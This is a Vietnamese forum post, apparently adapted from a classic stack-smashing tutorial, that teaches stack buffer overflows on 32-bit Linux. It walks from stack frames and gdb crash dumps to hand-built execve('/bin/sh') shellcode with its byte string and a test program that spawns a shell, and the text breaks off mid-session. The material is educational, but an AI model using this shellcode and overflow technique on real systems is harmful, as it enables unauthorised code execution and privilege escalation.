                    <td valign="top" class="row2"><span class="postbody">Tác giả: boymc<br/> <br/> <font color='yellow'><b>Hướng dẫn viết "tràn bộ đệm"</b></font><br/> <br/> Lời mở đầu<br/> <br/> Tràn bộ đệm là một trong những lỗ hỏng bảo mật lớn nhất hiện nay. Vậy tràn bộ đệm là gì? Làm thế nào để thi hành các mã lệnh nguy hiểm qua tràn bộ đệm...?<br/> <br/> ***Lưu ý*** một ít kiến thức về Assembly, C, GDB và Linux là điều cần thiết đối với bạn!<br/> <br/> Sơ đồ tổ chức bộ nhớ của một chương trình<br/> <br/> /------------------\ địa chỉ vùng nhớ cao<br/> | |<br/> | Stack | <br/> | | <br/> |------------------|<br/> | (Initialized) |<br/> | Data |<br/> | (Uninitialized) |<br/> |------------------|<br/> | |<br/> | Text |<br/> | |<br/> \------------------/ địa chỉ vùng nhớ thấp<br/> <br/> Stack và Heap?<br/> <br/> Heap là vùng nhớ dùng để cấp phát cho các biến tỉnh hoặc các vùng nhớ được cấp phát bằng hàm malloc()<br/> <br/> Stack là vùng nhớ dùng để lưu các tham số và các biến cục bộ của hàm.<br/> <br/> Các biến trên heap được cấp phát từ vùng nhớ thấp đến vùng nhớ cao. Trên stack thì hoàn toàn ngược lại, các biến được cấp phát từ vùng nhớ cao đến vùng nhớ thấp.<br/> <br/> Stack hoạt động theo nguyên tắc "vào sau ra trước"(Last In First Out - LIFO). Các giá trị được đẩy vào stack sau cùng sẽ được lấy ra khỏi stack trước tiên.<br/> <br/> PUSH và POP<br/> <br/> Stack đổ từ trên xuống duới(từ vùng nhớ cao đến vùng nhớ thấp). Thanh ghi ESP luôn trỏ đến đỉnh của stack(vùng nhớ có địa chỉ thấp).<br/> <br/> đỉnh của bộ nhớ /------------\ đáy của stack<br/> | |<br/> | |<br/> | |<br/> | |<br/> | |<br/> | | &lt;-- ESP<br/> đáy của bộ nhớ \------------/ đỉnh của stack<br/> <br/> * PUSH một value vào stack<br/> <br/> đỉnh của bộ nhớ /------------\ đáy của stack<br/> | |<br/> | |<br/> | |<br/> | |<br/> | | &lt;- ESP cũ<br/> |------------| <br/> (2) -&gt; value | &lt;- ESP mới = ESP cũ - sizeof(value) (1)<br/> đáy của bộ nhớ \------------/ đỉnh của stack<br/> <br/> 1/ ESP=ESP-sizeof(value)<br/> 2/ value được đẩy vào stack <br/> <br/> * POP một value ra khỏi stack<br/> <br/> đỉnh của bộ nhớ /------------\ đáy của stack<br/> | |<br/> | |<br/> | |<br/> | |<br/> | | &lt;- ESP mới = ESP cũ + sizeof(value)(2)<br/> |------------| <br/> (1) &lt;- value | &lt;- ESP cũ<br/> đáy của bộ nhớ \------------/ đỉnh của stack<br/> <br/> 1/ vaule được lấy ra khỏi stack<br/> 2/ ESP=ESP+sizeof(value) <br/> <br/> Khác nhau giữa các lệnh hợp ngữ AT&T với Intel<br/> <br/> Khác với MSDOS và WINDOWS, *NIX dùng các lệnh hợp ngữ AT&T. Nó hoàn toàn ngược lại với chuẩn của Intel/Microsoft.<br/> <br/> Ví dụ:<br/> <br/> Intel AT&T <br/> mov eax, esp movl %esp, %eax <br/> push 7 push $7 <br/> mov [esp+5], eax movl %eax, 0x5(%esp) <br/> inc ah incb %ah <br/> push 7 push $7 <br/> ... <br/> <br/> * Ghi chú:<br/> <br/> e - Extended 32 bits<br/> % - register<br/> mov %src, %des<br/> movl - move 1 long<br/> movb - move 1 byte<br/> movw - move 1 word<br/> $ - hằng<br/> # - chú thích<br/> ... <br/> <br/> Cách làm việc của hàm <br/> <br/> Thanh ghi EIP luôn trỏ đến địa chỉ của câu lệnh tiếp theo cần thi hành. <br/> <br/> Khi gọi hàm, đầu tiên các tham số được push vào stack theo thứ tự ngược lại. Tiếp theo địa chỉ của câu lệnh được push vào stack. Sau đó, thanh ghi EBP được push vào stack(dùng để lưu giá trị cũ của EBP). <br/> <br/> Khi kết thúc hàm, thanh ghi EBP được pop ra khỏi stack(phục hồi lại giá trị cũ của EBP). Sau đó địa chỉ trở về(ret address) được pop ra khỏi stack và lệnh tiếp theo sau lời gọi hàm sẽ được thi hành. <br/> <br/> Thanh ghi EBP được dùng để xác định các tham số và các biến cục bộ của hàm. <br/> <br/> Ví dụ:<br/> <br/> test.c<br/> ------------------------------------------------------------------------------<br/> void function(int a, int b, int c) {<br/> char buffer1[5];<br/> char buffer2[10];<br/> }<br/> <br/> void main() {<br/> function(1,2,3);<br/> }<br/> ------------------------------------------------------------------------------<br/> <br/> Để hiểu được chương trình gọi hàm function() như thế nào, bạn hãy compile vidu1.c, dùng tham số -S để phát mã assembly:<br/> <br/> [đt@localhost ~/vicki]$cc -S -o test.s test.c<br/> <br/> Xem file test.s, chúng ta sẽ thấy call function() được chuyển thành:<br/> <br/> pushl $3<br/> pushl $2<br/> pushl $1<br/> call function<br/> <br/> 3 tham số truyền cho function() lần lượt được push vào stack theo thứ tự ngược lại. Câu lệnh 'call' sẽ push con trỏ lệnh(tức là thanh ghi EIP) vào stack để lưu địa chỉ trở về.<br/> <br/> Các lệnh đầu tiêu trong hàm function() sẽ có dạng như sau:<br/> <br/> pushl %ebp<br/> movl %esp,%ebp<br/> subl $20,%esp<br/> <br/> Đầu tiên ESP(frame pointer) được push vào stack. Sau đó chương trình copy ESP vào EBP để tạo một FP pointer mới. Bạn dễ nhận thấy lúc này ESP và EBP đều đang trỏ đến ô nhớ chứa EBP cũ. Hãy ghi nhớ điều này. Tiếp theo ESP được trừ đi 20 để dành không gian cho các biến cục bộ của hàm function()<br/> <br/> Vì chương trình 32 bits nên 5 bytes buffer1 sẽ là 8 bytes(2 words) trong bộ nhớ(do làm tròn đến 4 bytes hay là 32 bits), 10 bytes buffer2 sẽ là 12 bytes trong bộ nhớ(3 words). Tổng cộng sẽ tốn 8+12=20 bytes cho các biến cục bộ của function() nên ESP phải bị trừ đi 20! Stack sẽ có dạng như sau:<br/> <br/> đáy của đỉnh của<br/> bộ nhớ bộ nhớ<br/> buffer2 buffer1 sfp ret a b c<br/> &lt;------ [ ][ ][ ][ ][ ][ ][ ]<br/> <br/> đỉnh của 12 bytes 8 bytes 4b 4b đáy của<br/> stack stack<br/> <br/> Trong hàm function(), nội dung thanh ghi EBP không bị thay đổi.<br/> <br/> 0xz%ebp dùng để xác định ô nhớ chứa tham số của hàm<br/> 0xfffffz%ebp dùng để xác định ô nhớ chứa biến cục bộ của hàm <br/> <br/> Khi kết thúc hàm function():<br/> <br/> movl %ebp,%esp<br/> popl %ebp<br/> ret<br/> movl %ebp, %esp sẽ copy EBP vào ESP. Vì EBP khi bắt đầu hàm trỏ đến ô nhớ chứa EBP cũ và EBP không bị thay đổi trong hàm function() nên sau khi thực hiện lệnh movl, ESP sẽ trỏ đến ô nhớ chứa EBP cũ. popl %ebp sẽ phục hồi lại giá trị cũ cho EBP đồng thời ESP sẽ bị giảm 4(ESP=ESP-sizeof(EBP cũ)) sau lệnh popl. Như vậy ESP sẽ trỏ đến ô nhớ chứa địa chỉ trở về(nằm ngay trên ô nhớ chứa EBP cũ). ret sẽ pop địa chỉ trở về ra khỏi stack, ESP sẽ bị giảm 4 và chương trình tiếp tục thi hành câu lệnh sau lệnh call function().<br/> <br/> Chương trình bị tràn bộ đệm<br/> <br/> Ví dụ:<br/> <br/> gets.c:<br/> ---------------------------------------<br/> int main()<br/> {<br/> char buf[20];<br/> gets(buf);<br/> }<br/> ---------------------------------------<br/> [đt@localhost ~/vicki]$ cc gets.c -o gets<br/> /tmp/cc4C6vaT.o: In function `main':<br/> /tmp/cc4C6vaT.o(.text+0xe): the `gets' function is dangerous and should not be used.<br/> [đt@localhost ~/vicki]$ <br/> gets(buf) sẽ nhận input data vào buf. Kích thước của buf chỉ là 20 bytes. Nếu ta đẩy data có kích thước lớn hơn 20 bytes vào buf, 20 bytes data đầu tiên sẽ vào mảng buf[20], các bytes data sau sẽ ghi đè lên EBP cũ và tiếp theo là ret addr. Như vậy chúng ta có thể thay đổi được địa chỉ trở về, điều này đồng nghĩa với việc chương trình bị tràn bộ đệm.<br/> <br/> đỉnh của bộ nhớ +-------------+ đáy của stack<br/> | return addr |<br/> +-------------+<br/> | EBP cũ |<br/> +-------------+<br/> | |<br/> | |<br/> | buf[20] |<br/> | |<br/> | |<br/> đáy của bộ nhớ +-------------+ đỉnh của stack<br/> Bạn hãy thử:<br/> <br/> [đt@localhost ~/vicki]$ perl -e 'print "A" x 24' | ./gets<br/> [đt@localhost ~/vicki]$ gdb gets core<br/> GNU gdb 5.0mdk-11mdk Linux-Mandrake 8.0<br/> Copyright 2001 Free Software Foundation, Inc.<br/> GDB is free software, covered by the GNU General Public License, and you are<br/> welcome to change it and/or distribute copies of it under certain conditions.<br/> Type "show copying" to see the conditions.<br/> There is absolutely no warranty for GDB. Type "show warranty" for details.<br/> This GDB was configured as "i386-mandrake-linux"...<br/> Core was generated by `./gets'.<br/> Program terminated with signal 11, Segmentation fault.<br/> Reading symbols from /lib/libc.so.6...done.<br/> Loaded symbols for /lib/libc.so.6<br/> Reading symbols from /lib/ld-linux.so.2...done.<br/> Loaded symbols for /lib/ld-linux.so.2<br/> #0 0x41414141 in ?? ()<br/> (gdb) info all<br/> eax 0xbffffbc4 -1073742908<br/> ecx 0xbffffbc4 -1073742908<br/> edx 0x40105dbc 1074814396<br/> ebx 0x4010748c 1074820236<br/> esp 0xbffffbe0 0xbffffbe0<br/> ebp 0x41414141 0x41414141 // hãy nhìn xem, chúng ta vừa ghi đè lên ebp<br/> esi 0x4000a610 1073784336<br/> edi 0xbffffc24 -1073742812<br/> eip 0x40031100 0x40031100<br/> eflags 0x10282 66178<br/> cs 0x23 35<br/> ss 0x2b 43<br/> ds 0x2b 43<br/> es 0x2b 43<br/> fs 0x2b 43<br/> gs 0x2b 43<br/> (gdb) quit<br/> [đt@localhost ~/vicki]$<br/> 0x41 chính là "A" ở dạng hex<br/> <br/> Bây giờ bạn hãy thử tiếp:<br/> <br/> [đt@localhost ~/vicki]$ perl -e 'print "A" x 28' | ./gets<br/> Segmentation fault<br/> [đt@localhost ~/vicki]$ gdb gets core<br/> GNU gdb 5.0mdk-11mdk Linux-Mandrake 8.0<br/> Copyright 2001 Free Software Foundation, Inc.<br/> GDB is free software, covered by the GNU General Public License, and you are<br/> welcome to change it and/or distribute copies of it under certain conditions.<br/> Type "show copying" to see the conditions.<br/> There is absolutely no warranty for GDB. Type "show warranty" for details.<br/> This GDB was configured as "i386-mandrake-linux"...<br/> Core was generated by `./gets'.<br/> Program terminated with signal 11, Segmentation fault.<br/> Reading symbols from /lib/libc.so.6...done.<br/> Loaded symbols for /lib/libc.so.6<br/> Reading symbols from /lib/ld-linux.so.2...done.<br/> Loaded symbols for /lib/ld-linux.so.2<br/> #0 0x41414141 in ?? ()<br/> (gdb) info all<br/> eax 0xbffffbc4 -1073742908<br/> ecx 0xbffffbc4 -1073742908<br/> edx 0x40105dbc 1074814396<br/> ebx 0x4010748c 1074820236<br/> esp 0xbffffbe0 0xbffffbe0<br/> ebp 0x41414141 0x41414141 // chúng ta đã ghi đè lên ebp<br/> esi 0x4000a610 1073784336<br/> edi 0xbffffc24 -1073742812<br/> eip 0x41414141 0x41414141 // chúng ta đã ghi đè lên eip<br/> eflags 0x10282 66178<br/> cs 0x23 35<br/> ss 0x2b 43<br/> ds 0x2b 43<br/> es 0x2b 43<br/> fs 0x2b 43<br/> gs 0x2b 43<br/> (gdb) quit<br/> [đt@localhost ~/vicki]$<br/> Địa chỉ trở về bị thay đổi thành 0x41414141, chương trình sẽ thi hành các lệnh tại 0x41414141, tuy nhiên đây là vùng cấm nên Linux đã báo lỗi "Segmentation fault"<br/> <br/> Shellcode<br/> <br/> Hình dung các đặt shellcode trên stack<br/> <br/> Ở ví dụ trước, chúng ta đã biết được nguyên nhân của tràn bộ đệm và cách thay đổi eip. Tuy nhiên, chúng ta cần phải thay đổi địa chỉ trở về trỏ đến shellcode để đổ một shell. Bạn có thể hình dung ra cách đặt shellcode trên stack như sau:<br/> <br/> Trước khi tràn bộ đệm:<br/> <br/> đáy của bộ nhớ đỉnh của bộ nhớ <br/> &lt;----- FFFFF BBBBBBBBBBBBBBBBBBBBB EEEE RRRR FFFFFFFFFF<br/> đỉnh của stack đáy của stack<br/> B = buffer<br/> E = stack frame pointer<br/> R = return address<br/> F = các data khác<br/> <br/> Khi tràn bộ đệm:<br/> <br/> đáy của bộ nhớ đỉnh của bộ nhớ<br/> &lt;----- FFFFF SSSSSSSSSSSSSSSSSSSSSSSSSAAAAAAAAFFFFFFFFF<br/> đỉnh của stack đáy của stack<br/> S = shellcode<br/> A = con trỏ đến shellcode<br/> F = các data khác<br/> <br/> (1) Lắp tràn bộ đệm(đến return addr) bằng địa chỉ của buffer<br/> (2) Đặt shellcode vào buffer<br/> <br/> Như vậy địa chỉ trở về sẽ trỏ đến shellcode, shellcode sẽ đổ một root shell. Tuy nhiên, thật khó để làm cho ret addr trỏ đến đúng shellcode. Có một cách khác, chúng ta sẽ đặt vào đầu của buffer một dãy lệnh NOP(NO oPeration - không xử lí), tiếp theo chúng ta đẩy shellcode vào sau NOPs. Như vậy khi thay đổi ret addr trỏ đến một nơi này đó ở đầu buffer, các lệnh NOP sẽ được thi hành, chúng không làm gì cả. Đến khi gặp các lệnh shellcode, shellcode sẽ làm nhiệm vụ đổ root shell. Stack có dạng như sau:<br/> <br/> đáy của bộ nhớ đỉnh của bộ nhớ<br/> &lt;----- FFFFF NNNNNNNNNNNSSSSSSSSSSSSSSAAAAAAAAFFFFFFFFF<br/> đỉnh của stack đáy của stack<br/> N = NOP<br/> S = shellcode<br/> A = con trỏ đến shellcode<br/> F = các data khác<br/> <br/> Viết và test thử shellcode<br/> <br/> Shellcode được đặt trên stack nên không thể nào dùng địa chỉ tuyệt đối. Chúng ta buộc phải dùng địa chỉ tương đối. Thật may cho chúng ta, lệnh jmp và call có thể chấp nhận các địa chỉ tương đối. Shellcode sẽ có dạng như sau:<br/> <br/> 0 jmp (nhảy xuống z bytes, tức là đến câu lệnh call)<br/> 2 popl %esi<br/> ... đăt các hàm tại đây ...<br/> Z call &lt;-Z+2&gt; (call sẽ nhảy lên z-2 bytes, đếb ngay câu lệnh sau jmp, POPL)<br/> Z+5 .string (biến)<br/> Giải thích: ở đầu shellcode chúng ta đặt một lệnh jmp đến call. call sẽ nhảy ngược lên lại câu lệnh ngay sau jmp, tức là câu lệnh popl %esi. Chúng ta đặt các dữ liệu .string ngay sau call. Khi lệnh call được thi hành, nó sẽ push địa chỉ của câu lệnh kế tiếp, trong trường hợp này là địa chỉ của .string vào stack. Câu lệnh ngay sau jmp là popl %esi, như vậy esi sẽ chứa địa chỉ của .string. Chúng ta đặt các hàm cần xử lí giữa popl %esi và call &lt;-z+2&gt;, các hàm này sẽ xác định các dữ liệu .string qua thanh ghi esi.<br/> <br/> Mã lệnh để đổ shell trong C có dạng như sau:<br/> <br/> shellcode.c<br/> -----------------------------------------------------------------------------<br/> #include <br/> <br/> void main() {<br/> char *name[2];<br/> <br/> name[0] = "/bin/sh";<br/> name[1] = NULL;<br/> execve(name[0], name, NULL);<br/> }<br/> ------------------------------------------------------------------------------<br/> Để tìm ra mã lệnh assembly thật sự của shellcode, bạn cần compile shellcode.c và sau đó chạy gdb. Nhớ dùng cờ -static khi compile shellcode.c để gộp các mã lệnh assembly thật sự của hàm execve vào, nếu không dùng cờ này, bạn chỉ nhận được một tham chiếu đến thư viện liên kết động của C cho hàm execve.<br/> <br/> [đt@localhost ~/vicki]$ gcc -o shellcode -ggdb -static shellcode.c<br/> [đt@localhost ~/vicki]$ gdb shellcode<br/> GNU gdb 5.0mdk-11mdk Linux-Mandrake 8.0<br/> Copyright 2001 Free Software Foundation, Inc.<br/> GDB is free software, covered by the GNU General Public License, and you are<br/> welcome to change it and/or distribute copies of it under certain conditions.<br/> Type "show copying" to see the conditions.<br/> There is absolutely no warranty for GDB. Type "show warranty" for details.<br/> This GDB was configured as "i386-mandrake-linux"...<br/> (gdb) disas main<br/> Dump of assembler code for function main:<br/> 0x8000130 : pushl %ebp<br/> 0x8000131 : movl %esp,%ebp<br/> 0x8000133 : subl $0x8,%esp<br/> 0x8000136 : movl $0x80027b8,0xfffffff8(%ebp)<br/> 0x800013d : movl $0x0,0xfffffffc(%ebp)<br/> 0x8000144 : pushl $0x0<br/> 0x8000146 : leal 0xfffffff8(%ebp),%eax<br/> 0x8000149 : pushl %eax<br/> 0x800014a : movl 0xfffffff8(%ebp),%eax<br/> 0x800014d : pushl %eax<br/> 0x800014e : call 0x80002bc &lt;__execve&gt;<br/> 0x8000153 : addl $0xc,%esp<br/> 0x8000156 : movl %ebp,%esp<br/> 0x8000158 : popl %ebp<br/> 0x8000159 : ret<br/> End of assembler dump.<br/> (gdb) disas __execve<br/> Dump of assembler code for function __execve:<br/> 0x80002bc &lt;__execve&gt;: pushl %ebp<br/> 0x80002bd &lt;__execve+1&gt;: movl %esp,%ebp<br/> 0x80002bf &lt;__execve+3&gt;: pushl %ebx<br/> 0x80002c0 &lt;__execve+4&gt;: movl $0xb,%eax<br/> 0x80002c5 &lt;__execve+9&gt;: movl 0x8(%ebp),%ebx<br/> 0x80002c8 &lt;__execve+12&gt;: movl 0xc(%ebp),%ecx<br/> 0x80002cb &lt;__execve+15&gt;: movl 0x10(%ebp),%edx<br/> 0x80002ce &lt;__execve+18&gt;: int $0x80<br/> 0x80002d0 &lt;__execve+20&gt;: movl %eax,%edx<br/> 0x80002d2 &lt;__execve+22&gt;: testl %edx,%edx<br/> 0x80002d4 &lt;__execve+24&gt;: jnl 0x80002e6 &lt;__execve+42&gt;<br/> 0x80002d6 &lt;__execve+26&gt;: negl %edx<br/> 0x80002d8 &lt;__execve+28&gt;: pushl %edx<br/> 0x80002d9 &lt;__execve+29&gt;: call 0x8001a34 &lt;__normal_errno_location&gt;<br/> 0x80002de &lt;__execve+34&gt;: popl %edx<br/> 0x80002df &lt;__execve+35&gt;: movl %edx,(%eax)<br/> 0x80002e1 &lt;__execve+37&gt;: movl $0xffffffff,%eax<br/> 0x80002e6 &lt;__execve+42&gt;: popl %ebx<br/> 0x80002e7 &lt;__execve+43&gt;: movl %ebp,%esp<br/> 0x80002e9 &lt;__execve+45&gt;: popl %ebp<br/> 0x80002ea &lt;__execve+46&gt;: ret<br/> 0x80002eb &lt;__execve+47&gt;: nop<br/> End of assembler dump.<br/> (gdb) quit<br/> Giải thích:<br/> <br/> 1/ main():<br/> <br/> 0x8000130 : pushl %ebp<br/> 0x8000131 : movl %esp,%ebp<br/> 0x8000133 : subl $0x8,%esp<br/> Các lệnh này bạn đã viết rồi. Nó sẽ lưu frame pointer cũ và tạo frame pointer mới từ stack pointer, sau đó dành chổ cho các biến cục bộ của main() trên stack, trong trường hợp này là 8 bytes:<br/> <br/> char *name[2];<br/> <br/> 2 con trỏ kiểu char, mỗi con trỏ dài 1 word nên phải tốn 2 word, tức là 8 bytes trên stack.<br/> <br/> 0x8000136 : movl $0x80027b8,0xfffffff8(%ebp)<br/> copy giá trị 0x80027b8(địa chỉ của chuổi "/bin/sh") vào con trỏ đầu tiên của mảng con trỏ name[]. Câu lệnh này tương đương với:<br/> <br/> name[0] = "/bin/sh";<br/> <br/> 0x800013d : movl $0x0,0xfffffffc(%ebp)<br/> copy giá trị 0x0(NULL) vào con trỏ thứ 2 của name[]. Câu lệnh này tương đương với:<br/> <br/> name[1] = NULL;<br/> <br/> Mã lệnh thật sự để call execve() bắt đầu tại đây:<br/> <br/> 0x8000144 : pushl $0x0<br/> push các tham số của hàm execve() vào stack theo thứ tự ngược lại, đầu tiên là NULL<br/> <br/> 0x8000146 : leal 0xfffffff8(%ebp),%eax<br/> nạp địa chỉ của name[] vào thanh ghi EAX<br/> <br/> 0x8000149 : pushl %eax<br/> push địa chỉ của name[] vào stack<br/> <br/> 0x800014a : movl 0xfffffff8(%ebp),%eax<br/> nạp địa chỉ của chuổi "/bin/sh" vào stack<br/> <br/> 0x800014e : call 0x80002bc &lt;__execve&gt;<br/> gọi hàm thư viện execve(). call sẽ push eip vào stack.<br/> <br/> 2/ execve():<br/> <br/> 0x80002bc &lt;__execve&gt;: pushl %ebp<br/> 0x80002bd &lt;__execve+1&gt;: movl %esp,%ebp<br/> 0x80002bf &lt;__execve+3&gt;: pushl %ebx<br/> đây là phần mở đầu của hàm, tôi không cần giải thích cho bạn nữa <br/> <br/> 0x80002c0 &lt;__execve+4&gt;: movl $0xb,%eax<br/> copy 0xb(11 decimal) vào stack. 11 = execve()<br/> <br/> 0x80002c5 &lt;__execve+9&gt;: movl 0x8(%ebp),%ebx<br/> copy địa chỉ của "/bin/sh" vào EBX<br/> <br/> 0x80002c8 &lt;__execve+12&gt;: movl 0xc(%ebp),%ecx<br/> copy địa chỉ của name[] vào ECX<br/> <br/> 0x80002cb &lt;__execve+15&gt;: movl 0x10(%ebp),%edx<br/> copy địa chỉ của con trỏ null vào EDX <br/> <br/> 0x80002ce &lt;__execve+18&gt;: int $0x80<br/> gọi ngắt $0x80 <br/> <br/> Tóm lại:<br/> <br/> a/ có một chuổi kết thúc bằng null "/bin/sh" ở đâu đó trong bộ nhớ<br/> b/ có địa chỉ của chuổi "/bin/sh" ở đâu đó trong bộ nhớ theo sau là 1 null dài 1 word<br/> c/ copy 0xb vào thanh ghi EAX<br/> d/ copy địa chỉ của địa chỉ của chuổi "/bin/sh" vào thanh ghi EBX<br/> e/ copy địa chỉ của chuổi "/bin/sh" vào thanh ghi ECX<br/> f/ copy địa chỉ của null dài 1 word vào thanh ghi EDX<br/> g/ gọi ngắt $0x80 <br/> <br/> Sau khi thi hành call execve, chương trình có thể thi hành tiếp các câu lệnh rác còn lại trên stack và chương trình có thể thất bại. Vì vậy, chúng ta phải nhanh chóng kết thúc chương trình bằng lời gọi hàm exit(). Exit syscall trong C có dạng như sau:<br/> <br/> exit.c<br/> ------------------------------------------------------------------------------<br/> #include <br/> <br/> void main() {<br/> exit(0);<br/> }<br/> ------------------------------------------------------------------------------<br/> Xem mã assemly của hàm exit():<br/> <br/> [đt@localhost ~/vicki]$ gcc -o exit -ggdb -static exit.c<br/> [đt@localhost ~/vicki]$ gdb exit<br/> GNU gdb 5.0mdk-11mdk Linux-Mandrake 8.0<br/> Copyright 2001 Free Software Foundation, Inc.<br/> GDB is free software, covered by the GNU General Public License, and you are<br/> welcome to change it and/or distribute copies of it under certain conditions.<br/> Type "show copying" to see the conditions.<br/> There is absolutely no warranty for GDB. Type "show warranty" for details.<br/> This GDB was configured as "i386-mandrake-linux"...<br/> (gdb) disas _exit<br/> Dump of assembler code for function _exit:<br/> 0x800034c &lt;_exit&gt;: pushl %ebp<br/> 0x800034d &lt;_exit+1&gt;: movl %esp,%ebp<br/> 0x800034f &lt;_exit+3&gt;: pushl %ebx<br/> 0x8000350 &lt;_exit+4&gt;: movl $0x1,%eax<br/> 0x8000355 &lt;_exit+9&gt;: movl 0x8(%ebp),%ebx<br/> 0x8000358 &lt;_exit+12&gt;: int $0x80<br/> 0x800035a &lt;_exit+14&gt;: movl 0xfffffffc(%ebp),%ebx<br/> 0x800035d &lt;_exit+17&gt;: movl %ebp,%esp<br/> 0x800035f &lt;_exit+19&gt;: popl %ebp<br/> 0x8000360 &lt;_exit+20&gt;: ret<br/> 0x8000361 &lt;_exit+21&gt;: nop<br/> 0x8000362 &lt;_exit+22&gt;: nop<br/> 0x8000363 &lt;_exit+23&gt;: nop<br/> End of assembler dump.<br/> (gdb) quit<br/> exit syscall sẽ đặt 0x1 vào EAX, đặt exit code trong EBX và gọi ngắt "int 0x80". exit code = 0 nghĩa là không gặp lỗi. Vì vậy chúng ta sẽ đặt 0 trong EBX.<br/> <br/> Tóm lại:<br/> <br/> a/ có một chuổi kết thúc bằng null "/bin/sh" ở đâu đó trong bộ nhớ<br/> b/ có địa chỉ của chuổi "/bin/sh" ở đâu đó trong bộ nhớ theo sau là 1 null dài 1 word<br/> c/ copy 0xb vào thanh ghi EAX<br/> d/ copy địa chỉ của địa chỉ của chuổi "/bin/sh" vào thanh ghi EBX<br/> e/ copy địa chỉ của chuổi "/bin/sh" vào thanh ghi ECX<br/> f/ copy địa chỉ của null dài 1 word vào thanh ghi EDX<br/> g/ gọi ngắt $0x80<br/> h/ copy 0x1 vào thanh ghi EAX<br/> i/ copy 0x0 vào thanh ghi EBX<br/> j/ gọi ngắt $0x80 <br/> <br/> Shellcode sẽ có dạng như sau:<br/> <br/> ------------------------------------------------------------------------------<br/> jmp offset-to-call # 2 bytes<br/> popl %esi # 1 byte<br/> movl %esi,array-offset(%esi) # 3 bytes<br/> movb $0x0,nullbyteoffset(%esi)# 4 bytes<br/> movl $0x0,null-offset(%esi) # 7 bytes<br/> movl $0xb,%eax # 5 bytes<br/> movl %esi,%ebx # 2 bytes<br/> leal array-offset,(%esi),%ecx # 3 bytes<br/> leal null-offset(%esi),%edx # 3 bytes<br/> int $0x80 # 2 bytes<br/> movl $0x1, %eax # 5 bytes<br/> movl $0x0, %ebx # 5 bytes<br/> int $0x80 # 2 bytes<br/> call offset-to-popl # 5 bytes<br/> /bin/sh string goes here.<br/> ------------------------------------------------------------------------------<br/> Tính toán các offsets từ jmp đến call, từ call đến popl, từ địa chỉ của chuổi đến mảng, và từ địa chỉ của chuổi đến word null, chúng ta sẽ có shellcode thật sự:<br/> <br/> ------------------------------------------------------------------------------<br/> jmp 0x26 # 2 bytes<br/> popl %esi # 1 byte<br/> movl %esi,0x8(%esi) # 3 bytes<br/> movb $0x0,0x7(%esi) # 4 bytes<br/> movl $0x0,0xc(%esi) # 7 bytes<br/> movl $0xb,%eax # 5 bytes<br/> movl %esi,%ebx # 2 bytes<br/> leal 0x8(%esi),%ecx # 3 bytes<br/> leal 0xc(%esi),%edx # 3 bytes<br/> int $0x80 # 2 bytes<br/> movl $0x1, %eax # 5 bytes<br/> movl $0x0, %ebx # 5 bytes<br/> int $0x80 # 2 bytes<br/> call -0x2b # 5 bytes<br/> .string \"/bin/sh\" # 8 bytes<br/> ------------------------------------------------------------------------------<br/> Để biết mã máy của các lệnh hợp ngữ trên ở dạng hexa, bạn cần compile shellcodeasm.c và gdb shellcodeasm:<br/> <br/> shellcodeasm.c<br/> ------------------------------------------------------------------------------<br/> void main() {<br/> __asm__("<br/> jmp 0x2a # 3 bytes<br/> popl %esi # 1 byte<br/> movl %esi,0x8(%esi) # 3 bytes<br/> movb $0x0,0x7(%esi) # 4 bytes<br/> movl $0x0,0xc(%esi) # 7 bytes<br/> movl $0xb,%eax # 5 bytes<br/> movl %esi,%ebx # 2 bytes<br/> leal 0x8(%esi),%ecx # 3 bytes<br/> leal 0xc(%esi),%edx # 3 bytes<br/> int $0x80 # 2 bytes<br/> movl $0x1, %eax # 5 bytes<br/> movl $0x0, %ebx # 5 bytes<br/> int $0x80 # 2 bytes<br/> call -0x2f # 5 bytes<br/> .string \"/bin/sh\" # 8 bytes<br/> ");<br/> }<br/> ------------------------------------------------------------------------------<br/> [đt@localhost ~/vicki]$ gcc -o shellcodeasm -g -ggdb shellcodeasm.c<br/> [đt@localhost ~/vicki]$ gdb shellcodeasm<br/> GNU gdb 5.0mdk-11mdk Linux-Mandrake 8.0<br/> Copyright 2001 Free Software Foundation, Inc.<br/> GDB is free software, covered by the GNU General Public License, and you are<br/> welcome to change it and/or distribute copies of it under certain conditions.<br/> Type "show copying" to see the conditions.<br/> There is absolutely no warranty for GDB. Type "show warranty" for details.<br/> This GDB was configured as "i386-mandrake-linux"...<br/> (gdb) disas main<br/> Dump of assembler code for function main:<br/> 0x8000130 : pushl %ebp<br/> 0x8000131 : movl %esp,%ebp<br/> 0x8000133 : jmp 0x800015f <br/> 0x8000135 : popl %esi<br/> 0x8000136 : movl %esi,0x8(%esi)<br/> 0x8000139 : movb $0x0,0x7(%esi)<br/> 0x800013d : movl $0x0,0xc(%esi)<br/> 0x8000144 : movl $0xb,%eax<br/> 0x8000149 : movl %esi,%ebx<br/> 0x800014b : leal 0x8(%esi),%ecx<br/> 0x800014e : leal 0xc(%esi),%edx<br/> 0x8000151 : int $0x80<br/> 0x8000153 : movl $0x1,%eax<br/> 0x8000158 : movl $0x0,%ebx<br/> 0x800015d : int $0x80<br/> 0x800015f : call 0x8000135 <br/> 0x8000164 : das<br/> 0x8000165 : boundl 0x6e(%ecx),%ebp<br/> 0x8000168 : das<br/> 0x8000169 : jae 0x80001d3 &lt;__new_exitfn+55&gt;<br/> 0x800016b : addb %cl,0x55c35dec(%ecx)<br/> End of assembler dump.<br/> (gdb) x/bx main+3<br/> 0x8000133 : 0xeb<br/> (gdb)<br/> 0x8000134 : 0x2a<br/> (gdb)<br/> .<br/> .<br/> .<br/> (gdb) quit<br/> Ghi chú: x/bx dùng để hiển thị mã máy ở dạng hexa của lệnh hợp ngữ<br/> <br/> Bây giờ bạn hãy test thử shellcode đầu tiên:<br/> <br/> testsc1.c<br/> ------------------------------------------------------------------------------<br/> char shellcode[] =<br/> "\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00"<br/> "\x00\xb8\x0b\x00\x00\x00\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80"<br/> "\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xd1\xff\xff"<br/> "\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00\x89\xec\x5d\xc3";<br/> <br/> void main() {<br/> int *ret;<br/> <br/> ret = (int *)&ret + 2;<br/> (*ret) = (int)shellcode;<br/> <br/> }<br/> ------------------------------------------------------------------------------<br/> <br/> [đt@localhost ~/vicki]$ cc -o testsc1 testsc1.c<br/> [đt@localhost ~/vicki]$ ./testsc1<br/> sh-2.04$ exit<br/> [đt@localhost 